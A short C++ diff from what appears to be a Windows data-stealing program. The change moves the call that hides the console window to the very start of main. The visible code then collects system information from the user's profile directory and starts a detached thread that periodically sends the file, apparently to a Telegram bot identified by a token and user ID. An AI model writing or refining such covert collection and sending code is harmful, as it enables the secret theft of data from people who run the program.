@@ -35,6 +35,11 @@ int main()
 {
     setlocale(LC_ALL, "Russian");
 
+    if (hideWindow == true)
+    {
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+    }
+
     const char *userProfilePath = std::getenv("USERPROFILE");
     char dirPath[MAX_PATH] = {0};
     char infoPath[MY_MAX_PATH] = {0};
@@ -71,11 +76,6 @@ int main()
         }
     }
     writeSystemInfoToFile(winfoPath);
-
-    if (hideWindow == true)
-    {
-        ShowWindow(GetConsoleWindow(), SW_HIDE);
-    }
 
     std::thread sender(periodicSend, botToken, userID, wlocation, winfoPath);
     sender.detach();
